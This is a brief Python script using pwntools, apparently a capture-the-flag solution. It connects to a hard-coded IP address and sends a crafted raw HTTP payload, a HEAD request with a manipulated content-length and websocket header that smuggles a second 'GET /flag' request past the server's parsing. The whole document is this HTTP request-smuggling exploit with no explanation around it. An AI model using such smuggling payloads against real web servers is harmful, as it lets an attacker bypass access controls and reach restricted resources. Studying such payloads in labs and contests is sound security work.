from pwn import *

host = '35.197.203.104'
port = 8080

conn = remote(host, port)

conn.send("HEAD / HTTP/1.1\r\ncontent-length: 30\r\nsec-websocket-key1: a\r\n\r\nAAAAAAAAGET /flag HTTP/1.1\r\n\r\nGET / HTTP/1.1\r\n\r\n")

conn.interactive()

print(conn.recv())
